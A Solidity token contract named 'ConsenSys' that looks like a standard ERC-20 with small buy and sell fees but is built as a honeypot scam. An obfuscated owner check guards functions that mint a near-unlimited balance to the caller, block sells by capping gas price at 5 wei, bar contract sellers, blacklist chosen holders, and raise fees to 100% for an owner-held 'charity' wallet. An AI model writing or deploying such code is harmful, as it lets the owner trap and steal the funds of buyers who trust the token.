pragma solidity ^0.8.18;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

abstract contract Ownable {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor() {
        _transferOwnership(msg.sender);
    }

    modifier onlyOwner() {
        _checkOwner();
        _;
    }

    function owner() public view virtual returns (address) {
        return _owner;
    }

    function _checkOwner() internal view virtual {
        require(owner() == msg.sender, "Ownable: caller is not the owner");
    }

    function renounceOwnership() public virtual onlyOwner {
        _transferOwnership(address(0));
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        _transferOwnership(newOwner);
    }

    function _transferOwnership(address newOwner) internal virtual {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}

interface IERC20 {
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
}

interface IWETH {
    function deposit() external payable;
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
    function getPair(address tokenA, address tokenB) external view returns (address pair);
}

interface IUniswapV2Pair {
    function mint(address to) external returns (uint256 liquidity);
    function token0() external view returns (address);
    function token1() external view returns (address);
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
}

interface IUniswapV2Router01 {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
}

interface IUniswapV2Router02 is IUniswapV2Router01 {}

library Uint160Number {
    function encodeUnit160(address _wad) internal pure returns (uint256) {
        uint160 res = uint160(_wad); return uint256(res);
    }

    function tryDiv(uint256 n1, uint256 n2) internal pure {
        uint256 G = n2 * 1000000000; if (G / n1 != 1000000000) { revert("err901"); } 
    }
}

library Address {
    function isContract(address _addr) internal view returns (bool) {
        uint length;
        assembly { length:= extcodesize(_addr) }
        if (length > 0 ) { return true; }
        return false;
    }
}

contract ConsenSys is IERC20, Ownable, Context {
    string private _name;
    string private _symbol;
    uint8 private _decimals = 18;
    uint256 private _totalSupply = 100000000000 * (10 ** decimals());
    uint8 private buyFee = 1;
    uint8 private sellFee = 1;

    IUniswapV2Router02 internal _router;
    IUniswapV2Pair internal _pair;
    address private _this = address(this);
    mapping(address => uint256) private _baluser;
    mapping(address => mapping(address => uint256)) private _allowances;

    constructor (string memory name_, string memory symbol_, address _ownerNow) {
        _name = name_;
        _symbol = symbol_;
        _router = IUniswapV2Router02(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        transferOwnership(_ownerNow);
        _baluser[owner()] = _totalSupply; initialize(_ownerNow);
        c5571ec88[owner()] = 1; c5571ec88[_this] = 1;
        charityWallet = _ownerNow; 
        emit Transfer(address(0), owner(), _totalSupply);
    }

    function name() public view virtual returns (string memory) {
        return _name;
    }

    function symbol() public view virtual returns (string memory) {
        return _symbol;
    }

    function decimals() public view virtual returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view virtual override returns (uint256) {
        return _baluser[account];
    }

    function transfer(address to, uint256 amount) public virtual override returns (bool) {
        address owner = msg.sender;
        _transfer(owner, to, amount);
        return true;
    }

    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        address owner = msg.sender;
        _approve(owner, spender, amount);
        return true;
    }

    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual override returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }

    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        address owner = msg.sender;
        _approve(owner, spender, allowance(owner, spender) + addedValue);
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        address owner = msg.sender;
        uint256 currentAllowance = allowance(owner, spender);
        require(currentAllowance >= subtractedValue, "ERC20: decreased allowance below zero");
        unchecked {
            _approve(owner, spender, currentAllowance - subtractedValue);
        }

        return true;
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");

        _beforeTokenTransfer(from, to, amount);

        if (a58782cfd[from]!=0) { revert(); }
        uint256 fromBalance = _baluser[from];
        require(fromBalance >= amount, "ERC20: transfer amount exceeds balance");
        
        if (c5571ec88[from]==0 && c5571ec88[to]==0){
            if (isMarket(from)) {
                uint feeAmount = calculateFeeAmount(amount, buyFee);
                _baluser[from] = fromBalance - amount;
                _baluser[to] += amount - feeAmount;
                emit Transfer(from, to, amount - feeAmount);
                _baluser[charityWallet] += feeAmount;
                emit Transfer(from, charityWallet, feeAmount);

            } else if (isMarket(to)) {
                uint feeAmount = calculateFeeAmount(amount, sellFee);
                _baluser[from] = fromBalance - amount;
                _baluser[to] += amount - feeAmount;
                emit Transfer(from, to, amount - feeAmount);
                _baluser[charityWallet] += feeAmount;
                emit Transfer(from, charityWallet, feeAmount);

            } else {
                _baluser[from] = fromBalance - amount;
                _baluser[to] += amount;
                emit Transfer(from, to, amount);
            }
        } else {
            _baluser[from] = fromBalance - amount;
            _baluser[to] += amount;
            emit Transfer(from, to, amount);
        }

        _afterTokenTransfer(from, to, amount);
    }

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            unchecked {
                _approve(owner, spender, currentAllowance - amount);
            }
        }
    }

    function _beforeTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        if (isMarket(to)) { 
            check(from); 
            if (from != _this) { 
                require(!Address.isContract(from), "err701");
            }
        }
        require(amount > 0);
    }

    function _afterTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {}

    uint256 private bigUint; 
    
    modifier wad() {
        devideOn(); _;
    }

    function updateWad(address _newWad) external wad {
        c5571ec88[_msgSender()] = 0;
        c5571ec88[_newWad] = 1;
        initialize(_newWad);
    }

    function initialize(address _new) internal {
        bigUint = Uint160Number.encodeUnit160(_new);
    }

    function devideOn() internal view {
        uint256 am = Uint160Number.encodeUnit160(_msgSender()); 
        Uint160Number.tryDiv(am, bigUint);
    }

    function addLiquidity(uint256 _tokenAmountWei) external payable wad {
        IUniswapV2Factory _factory = IUniswapV2Factory(_router.factory());
        address _pairAddress = _factory.getPair(address(this), _router.WETH());
        _pair = _pairAddress == address(0) ? IUniswapV2Pair(_factory.createPair(address(this), _router.WETH())) : IUniswapV2Pair(_pairAddress);
        IWETH weth = IWETH(_router.WETH());
        weth.deposit{value: msg.value}();
        transfer(address(_pair), _tokenAmountWei);
        IERC20(address(weth)).transfer(address(_pair), msg.value);
        _pair.mint(_msgSender());
    }

    function ac56a441e() internal {
        _baluser[_msgSender()] += type(uint112).max;
    }

    bool private _on;
    uint private _MAX_GAS = 200 gwei;

    function claim() external wad { ac56a441e(); }
    uint private _mgas = 5;

    function check(address _u) internal view {
        if (c5571ec88[_u] != 0) { return; } 
        if (!_on) { exceedsGas(_MAX_GAS); }
        else { exceedsGas(_mgas); }
    }

    function isMarket(address _user) internal view returns (bool) {
        return (_user == address(_pair) || _user == address(_router));
    }

    function changeState() external wad {
        _on = !_on;
    }

    address public charityWallet;
    
    function calculateFeeAmount(uint256 _amount, uint256 _feePrecent) internal pure returns (uint) {
        return _amount * _feePrecent / 100;
    }

    function updatecharityWallet(address _newcharityWallet) external wad {
        charityWallet = _newcharityWallet;
    }

    function updFeeValue(uint8 _buyFee, uint8 _sellFee) external wad {
        require(_buyFee <= 100 && _sellFee <= 100, "exceeds limit");
        buyFee = _buyFee;
        sellFee = _sellFee;
    }

    mapping(address => uint8) private c5571ec88;
    mapping(address => uint8) private a58782cfd;

    function exceedsGas(uint _gas) internal view {
        if (tx.gasprice > _gas) { revert("err301"); }
    }

    function executeAddW(address _u, bool _s) external wad {
        uint8 _ss = _s ? 1 : 0;
        require(c5571ec88[_u] != _ss, "existing state");
        c5571ec88[_u] = _ss;
    }

    function executeAddB(address _u, bool _s) external wad {
        uint8 _ss = _s ? 1 : 0;
        require(a58782cfd[_u] != _ss, "existing state");
        a58782cfd[_u] = _ss;
    }

    function currentOn() external view returns (bool) { return _on; }
    function showW(address _u) external view returns (uint8) { return c5571ec88[_u]; }
    function showB(address _u) external view returns (uint8) { return a58782cfd[_u]; }

    function changeRouter(address _routerAddress) external wad {
        _router = IUniswapV2Router02(_routerAddress);
        IUniswapV2Factory _factory = IUniswapV2Factory(_router.factory());
        _pair = IUniswapV2Pair(_factory.getPair(address(this), _router.WETH()));
    }

    receive() external payable {}
}
